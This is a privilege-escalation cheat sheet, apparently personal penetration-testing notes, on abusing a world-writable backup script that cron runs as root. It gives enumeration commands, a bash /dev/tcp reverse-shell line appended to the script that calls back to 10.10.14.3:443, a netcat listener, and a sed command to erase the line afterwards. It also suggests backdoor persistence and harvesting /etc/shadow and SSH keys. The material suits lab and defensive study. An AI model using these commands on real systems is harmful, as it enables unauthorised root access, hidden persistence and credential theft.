### 1. Technique Name:

Cron Job Abuse â€“ Writable Scripts Run by Root
### 2. Summary:

Cron jobs are scheduled tasks typically used by administrators to automate repetitive processes. If a cron job is configured to execute a script as `root` and the script is writable by other users, an attacker can modify the script to execute arbitrary commands with elevated privileges. This can lead to full system compromise, especially if the misconfigured script is frequently executed.
### 3. Conditions / Requirements:

- Writable file or script that is executed by a cron job as `root`    
- The ability to modify the script (e.g., `chmod 777`, group-writable, or owner-writable with compromised user)
- The cron job runs the script as `root` (confirmed via `pspy` or process enumeration)
- (Optional) Crontab access not required if schedule is inferred or known
### 4. Enumeration:
#### A. Find world-writable files:

```bash
find / -type f -perm -o+w 2>/dev/null
```
#### B. Identify writable scripts inside cron paths:

```bash
ls -la /etc/cron* /var/spool/cron/
```
#### C. Use `pspy` to identify cron job executions:

```bash
./pspy64 -pf -i 1000
```

Look for patterns like:

```
CMD: UID=0    | /bin/bash /path/to/script.sh
```
#### D. Observe frequency from created artifacts (e.g., timestamped files):

```bash
ls -l /dmz-backups/
```
### 5. Exploitation:
#### A. Review the script content:

```bash
cat /dmz-backups/backup.sh
```
#### B. Append malicious command (e.g., reverse shell):

```bash
echo "bash -i >& /dev/tcp/10.10.14.3/443 0>&1" >> /dmz-backups/backup.sh
```
#### C. Start listener:

```bash
nc -lnvp 443
```
#### D. Wait for cron to trigger and connect back:

```bash
# Reverse shell received
uid=0(root) gid=0(root) groups=0(root)
```
### 6. Post-Exploitation:

- Clean the script after exploitation (optional):    

```bash
sed -i '/bash -i >& \/dev\/tcp/d' /dmz-backups/backup.sh
```

- Consider persistence (e.g., backdoor in a root-owned binary or scheduled task)
- Enumerate further for sensitive files (`/root/`, `/etc/shadow`, SSH keys)
### 7. Example:

Writable script:

```
-rwxrwxrwx  1 root root  230 backup.sh
```

Script content before:

```bash
#!/bin/bash
tar -czf /dmz-backups/www-$(date).tgz /var/www/html
```

Script after:

```bash
#!/bin/bash
tar -czf /dmz-backups/www-$(date).tgz /var/www/html
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Listener:

```bash
nc -lnvp 443
```

Result:

```bash
connect to [10.10.14.3] from [10.129.2.12] 38882
id
uid=0(root) gid=0(root) groups=0(root)
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #CronjobAbuse